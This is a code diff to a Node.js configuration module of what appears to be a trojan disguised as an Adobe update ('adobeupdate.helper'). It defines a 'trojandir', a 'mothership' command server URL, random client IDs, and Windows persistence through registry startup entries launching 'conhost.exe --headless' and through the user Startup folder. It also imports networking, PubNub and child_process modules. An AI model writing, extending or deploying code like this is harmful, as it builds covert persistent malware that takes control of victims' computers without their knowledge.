@@ -1,9 +1,68 @@
 const path = require("path");
-const helper = require("./adobeupdate.helper.js");
-const helper_cmd = require("./adobeupdate.helper.cmd.js");
+const PubNub = require("pubnub");
+const net = require("net");
+const { fork, exec, spawn } = require("child_process");
+const fs = require("fs");
+const os = require("os");
+const crypto = require("crypto");
+const util = require("util");
+
+function getRandomCode(n) {
+    const min = Math.pow(10, n - 1);
+    const max = Math.pow(10, n) - 1;
+
+    return crypto.randomInt(min, max + 1).toString();
+}
+
+function getTimestamp() {
+    const date = new Date();
+
+    // Extract components
+    const year = date.getFullYear();
+    const month = String(date.getMonth() + 1).padStart(2, "0"); //
+    const day = String(date.getDate()).padStart(2, "0"); //
+    const hours = String(date.getHours()).padStart(2, "0"); //
+    const minutes = String(date.getMinutes()).padStart(2, "0"); //
+    const seconds = String(date.getSeconds()).padStart(2, "0"); //
+    const ms = String(date.getMilliseconds()).padStart(3, "0"); //
+
+    // Combine into final strings
+    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
+    const fullWithMs = `${yyyymmddhhmmss}${ms}`;
+
+    return fullWithMs;
+}
+
+function fileExists(filePath) {
+    try {
+        const stats = fs.statSync(filePath);
+        return stats.isFile();
+    } catch (error) {
+        return false;
+    }
+}
+
+function getFileMD5(fpath) {
+    if (!fileExists(fpath)) {
+        throw new Error("file does not exist [" + fpath + "]");
+    }
+
+    const fileBuffer = fs.readFileSync(fpath);
+
+    return crypto.createHash("md5").update(fileBuffer).digest("hex");
+}
+
+function isNullOrWhitespace(str) {
+    if (typeof str === "undefined" || str === null) {
+        return true;
+    }
+
+    if (!(typeof str === "string")) return true;
+
+    return !str || !str.trim();
+}
 
 var mothershipconfig = {
-
     get mothershipconfigfpath() {
         return path.join(systemconfig.trojandir, "mothership");
     },
@@ -29,7 +88,7 @@ var mothershipconfig = {
 
         let mothershipurl = "";
 
-        if ( helper.fileExists(this.mothershipconfigfpath) ) {
+        if (helper.fileExists(this.mothershipconfigfpath)) {
             mothershipurl = helper.readTag(this.mothershipconfigfpath);
 
             if (!helper.isNullOrWhitespace(mothershipurl)) {
@@ -64,6 +123,8 @@ var mothershipconfig = {
 
 // TODO move mothership config details to mothershipconfig
 var systemconfig = {
+    cmdname: "",
+    cmdtaskname: "",
 
     // TODO reconcile machinename, username, userid
 
@@ -74,7 +135,11 @@ var systemconfig = {
     get istpl() {
         let machineprefix = this.machinename.toLowerCase().substring(0, 5);
 
-        if ( [ "ADULT2022", "LC2022", "CAT2022" ].includes(this.username.toUpperCase()) ) {
+        if (
+            ["ADULT2022", "LC2022", "CAT2022"].includes(
+                this.username.toUpperCase()
+            )
+        ) {
             return true;
         }
 
@@ -85,7 +150,7 @@ var systemconfig = {
             return true;
         }
 
-        if (helper.fileExists(path.join(this.scriptdir, "tplmode"))) {
+        if (fileExists(path.join(this.scriptdir, "tplmode"))) {
             return true;
         }
 
@@ -112,35 +177,17 @@ var systemconfig = {
         return path.join(this.trojandir, this.launch_script_fname);
     },
 
-    get cmdname() {
-        let tcmdname = process_argv.length >= 3 ? process_argv[2] : "watchdog";
-
-        if (tcmdname == "launch_ping") tcmdname = "watchdog";
-
-        return tcmdname;
-    },
-
-    __cmdconfig: null,
-
-    get cmdconfig() {
-        if (this.__cmdconfig) return this.__cmdconfig;
-
-        this.__cmdconfig = new helper_cmd.CmdConfig(this.cmdname);
-        return this.__cmdconfig;
-    },
-
-    get cmdtaskname() {
-        return this.cmdconfig.cmdtaskname;
-    },
-
     getClientJobPath() {
-        return path.join(systemconfig.trojandir, "clientjob_" + getRandomCode(8));
+        return path.join(
+            systemconfig.trojandir,
+            "clientjob_" + helper.getRandomCode(8)
+        );
     },
 
     getClientJobConfigPath() {
         return path.join(
             this.trojandir,
-            "clientjobconfig_" + getRandomCode(8) + ".json"
+            "clientjobconfig_" + helper.getRandomCode(8) + ".json"
         );
     },
 
@@ -160,14 +207,14 @@ var systemconfig = {
     __clientid: "",
 
     get clientid() {
-        if (isNullOrWhitespace(this.__clientid)) {
-            if (fileExists(systemconfig.clientidfpath))
-                this.__clientid = readTag(systemconfig.clientidfpath);
+        if (helper.isNullOrWhitespace(this.__clientid)) {
+            if (helper.fileExists(systemconfig.clientidfpath))
+                this.__clientid = helper.readTag(systemconfig.clientidfpath);
         }
 
-        if (isNullOrWhitespace(this.__clientid)) {
-            this.__clientid = getRandomCode(8);
-            writeTag(systemconfig.clientidfpath, this.__clientid);
+        if (helper.isNullOrWhitespace(this.__clientid)) {
+            this.__clientid = helper.getRandomCode(8);
+            helper.writeTag(systemconfig.clientidfpath, this.__clientid);
         }
 
         return this.__clientid;
@@ -247,12 +294,8 @@ var systemconfig = {
         return process.ppid;
     },
 
-    get scriptpid() {
-        return process.pid;
-    },
-
     get scriptfpath() {
-        return process_argv[1];
+        return helper_ps.process_argv[1];
     },
 
     get scriptdir() {
@@ -273,10 +316,11 @@ var systemconfig = {
     },
 
     scriptts: getTimestamp(),
+
     __scriptmd5: "",
     get scriptmd5() {
         if (isNullOrWhitespace(this.__scriptmd5))
-            this.__scriptmd5 = helper.getFileMD5(this.scriptfpath);
+            this.__scriptmd5 = getFileMD5(this.scriptfpath);
 
         return this.__scriptmd5;
     },
@@ -285,24 +329,6 @@ var systemconfig = {
 
     get sessionid() {
         return this.__sessionid;
-    },
-
-    get logfpath() {
-        return path.join(
-            this.trojandir,
-            "master_" +
-            this.cmdname +
-            (!isNullOrWhitespace(this.cmdtaskname)
-                ? "_" + this.cmdtaskname
-                : "") +
-            "_" +
-            this.scriptts +
-            ".log"
-        );
-    },
-
-    get lockfname() {
-        return this.cmdconfig.lockfname;
     },
 
     get statekvp() {
@@ -346,7 +372,10 @@ var regstartupconfig = {
     },
 
     get_startup_value(reg_obj) {
-        let tpath = path.join(systemconfig.trojandir, systemconfig.launch_script_fname);
+        let tpath = path.join(
+            systemconfig.trojandir,
+            systemconfig.launch_script_fname
+        );
         return `conhost.exe --headless ${tpath} ${reg_obj.name}`;
     },
 
@@ -487,8 +516,7 @@ var startupfolderconfig = {
         {
             enabled: true,
             name: "startup_user",
-            folderpath:
-                `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
+            folderpath: `C:\\Users\\${systemconfig.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
         },
     ],
 };
@@ -497,5 +525,8 @@ module.exports = {
     systemconfig,
     mothershipconfig,
     regstartupconfig,
-    startupfolderconfig
+    startupfolderconfig,
 };
+
+const helper = require("./adobeupdate.helper.js");
+const helper_ps = require("./adobeupdate.helper.ps.js");
